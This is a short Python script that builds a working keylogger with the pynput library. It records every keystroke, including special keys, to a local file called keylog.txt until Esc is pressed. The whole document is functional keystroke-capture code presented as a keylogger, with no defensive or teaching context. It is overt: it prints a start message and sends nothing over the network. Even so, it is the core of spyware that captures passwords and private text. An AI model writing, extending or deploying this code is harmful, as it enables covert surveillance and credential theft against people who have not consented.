from pynput import keyboard

# Path to the log file where keystrokes will be saved
log_file = "keylog.txt"

# Function to log the keystrokes
def on_press(key):
    try:
        # Check if the key is a special key (e.g., space, enter, shift)
        if hasattr(key, 'char') and key.char is not None:
            with open(log_file, 'a') as f:
                f.write(key.char)  # Write the character to the file
        else:
            with open(log_file, 'a') as f:
                f.write(f"[{key}]")  # Log special keys with their name
    except AttributeError:
        pass

# Function to stop the listener
def on_release(key):
    if key == keyboard.Key.esc:  # Press Esc to stop the logger
        return False

# Set up the listener for key events
def start_keylogger():
    # Start listening to the keyboard
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    start_keylogger()